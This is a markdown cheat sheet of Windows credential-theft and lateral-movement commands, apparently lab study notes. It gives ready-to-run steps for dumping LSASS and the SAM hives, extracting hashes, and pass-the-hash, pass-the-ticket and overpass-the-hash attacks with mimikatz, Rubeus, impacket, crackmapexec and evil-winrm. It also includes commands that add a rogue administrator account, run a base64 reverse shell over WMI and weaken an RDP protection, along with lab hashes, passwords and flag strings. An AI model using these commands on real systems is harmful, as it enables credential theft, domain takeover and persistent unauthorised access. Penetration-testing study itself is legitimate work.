---
title: windows privilege escalation
---

# windows privilege escalation
- lsass
    - powershell
        - get Id from `Get-Process lsass`
        - `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\Users\Johanna\Documents\dbcyph0n\lsass.dmp full`
    - taskmanager 
        - look for "Local Security Authority Process" in processes tab
        - right click and choose "Create dump file"
- sam
    - `reg.exe save hklm\sam C:\sam.save`
    - `reg.exe save hklm\system C:\system.save`
    - `reg.exe save hklm\security C:\security.save`
    - copy files to kali
    - secrets dump 
        - `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
    - secrets dump remotely
        - `crackmapexec smb $ip --local-auth -u david -p gRzX7YbeTcDG7 --sam`
- pass the hash
    - UAC limites pass the hash for local accounts
        - UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
    - get
        - local sam database
        - extracting hashes from ntds.dit on a DC
        - from memory using lsass.exe
    - [mimikatz](kb/htb/redteam/assets/tools/mimikatz.md)
        - exec command
            - `mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /rc4:$hash /domain:ms01 /run:cmd.exe" exit`
        - dump hashes
            - `mimikatz.exe privilege::debug "sekurlsa::logonpasswords /user:Administrator /rc4:$hash /domain:ms01" exit`
        - accessing network paths `\\dc01\data`
            - xfreerdp to device
            - run mimikatz using `sekurlsa::pth /user:david /domain:inlanefreight.htb /rc4:c39f2beb3d2ec06a62cb887fb391dee0`
    - [invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
        - `Import-Module .\Invoke-TheHash.psd1`
            - smb create new user  
                    - `Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
            - wmi reverse shell
                - https://www.revshells.com/ -> `Powershell #3 (Base64)`
                - `Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e $base64EncodedReverseShell"`
    - [impacket](https://github.com/SecureAuthCorp/impacket)
        - [netexec documentation](https://www.netexec.wiki/)
        - `impacket-psexec administrator@10.129.201.126 -hashes :$hash`
        - `impacket-wmiexec`
        - `impacket-atexec`
        - `impacket-smbexec`
    - [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
        - password spray against all machines in cidr using a hash
            - `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H $hash`
        - got a local administrator hash
            - `crackmapexec smb $ip -u Administrator -d . -H $hash --local-auth`
        - command execution
            - `crackmapexec smb $ip -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
    - evil-winrm
        - `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
    - xfreerdp
        - requires restricted admin mode on client
            - `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
        - `xfreerdp  /v:$ip /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453`
- pass the ticket
    - TGT - Ticket Granting Ticket is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS. We can use to request service tickets to access any resource the user has privileges.
    - TGS - Ticket Granting Service is requested by users who want to use a service. These tickets allow services to verify the user's identity. We can use to allow access to a particular resource  eg sql server
    - tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process
        - Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
    - mimizatz
        - `mimikatz # privilege::debug`
        - export all tickets
            - `mimikatz # sekurlsa::tickets /export`
                - $ correspond to the computer account, which needs a ticket to interact with the Active Directory
                - User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.
                - Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
        - `mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"`
            - *note*: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.
        - powershell remoting 
            - `mimikatz # exit`
            - `powershell.exe`
            - `Enter-PSSession -ComputerName DC01`

    - rubeus
        - run as local admin
        - `Rubeus.exe dump /nowrap`
            - print all     the ticket encoded in base64 format
        - `Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap`
        - import ticket into current session
            - use cmd line
                - `Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt`
            - use `.kirbi` file
                - `Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`
            - use base 64 format
                - Convert .kirbi to Base64 Format
                    - `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
                - `Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT0<SNIP>`
        - powershell remoting
            - Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly
            - create sacrificial process
                - `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`
            - in new window
                - `C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt`
            - `powershell.exe`
            - `Enter-PSSession -ComputerName DC01`
- [Pass the Key or OverPass the Hash](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18)
    - Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos
    - Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT)
    - need the users hash
    - mimikatz
        - Extract Kerberos Keys 
            - *requires administrative rights*
            - `privilege::debug`
            - `sekurlsa::ekeys`
                - looking for `AES256_HMAC` and `RC4_HMAC` keys
            - `sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:key`





# notes
    15 kirbi files 
    Learn1ng_M0r3_Tr1cks_with_J0hn
    P4$$_th3_Tick3T_PSR
